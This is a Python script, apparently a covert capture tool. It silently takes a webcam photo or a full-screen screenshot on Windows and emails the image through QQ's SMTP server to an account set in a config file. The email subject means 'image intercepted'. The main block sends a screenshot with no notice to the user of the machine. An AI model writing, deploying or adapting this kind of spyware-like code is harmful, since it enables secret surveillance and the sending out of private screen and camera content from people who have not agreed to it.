# coding=utf-8
import smtplib
import email.mime.text
import email.header
import email.mime.multipart
import email.mime.image
import time

from src.Config import Config

user = Config.user
from_ = user[0]
to_ = user[0]
title = '图片截获'


def takePhoto(filename='temp.png') -> bytes:
    import cv2
    cap = cv2.VideoCapture(0)
    ret, img = cap.read()
    cap.release()
    if not ret:
        return b''
    cv2.imwrite(filename, img)
    with open(filename, 'rb') as r:
        get = r.read()
    # os.system(f'del "{filename}"')
    return get


def takeShortcut(filename='temp.png') -> bytes:
    import win32api
    import win32con
    import win32gui
    import win32ui
    # 获取桌面
    hdesktop = win32gui.GetDesktopWindow()
    # 分辨率适应
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    # 创建设备描述表
    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    # 创建一个内存设备描述表
    mem_dc = img_dc.CreateCompatibleDC()
    # 创建位图对象
    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
    # 截图至内存设备描述表
    mem_dc.BitBlt((0, 0), (width, height), img_dc, (0, 0), win32con.SRCCOPY)
    # 将截图保存到文件中
    screenshot.SaveBitmapFile(mem_dc, filename)
    # 内存释放
    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())

    with open(filename, 'rb') as r:
        get = r.read()
    return get


def sendMsg(pic_data: bytes):
    body = email.mime.text.MIMEText(
        f"""
            <p>获取于{time.asctime()}</p>
            <h3>查看图片</h3>
            <img src='cid:get'/>""",  # 指定图片ID
        'html', 'utf-8')
    msg = email.mime.multipart.MIMEMultipart()
    msg.add_header('From', from_)
    msg.add_header('To', to_)
    msg.add_header('Subject', title)
    msg.attach(body)  # 添加内容到消息

    if pic_data:
        pic = email.mime.image.MIMEImage(pic_data)
        pic.add_header('Content-ID', '<get>')  # 设置图片ID
        msg.attach(pic)
    # 开启发信服务，这里使用的是加密传输
    host = 'smtp.qq.com'
    sender = smtplib.SMTP_SSL(host, 465)  # 连接服务器
    sender.login(*user)
    sender.sendmail(from_, [to_], msg.as_string())
    sender.quit()


if '__main__' == __name__:
    # try:
    #     sendMsg(takePhoto())
    # except Exception as e:
    #     root = tk.Tk()
    #     root.title("ErrorMessage")
    #     text = tk.Text(root)
    #     text.insert(0.0, traceback.format_exc())
    #     text.pack(expand=1, fill=tk.BOTH)
    #     root.mainloop()
    sendMsg(takeShortcut())
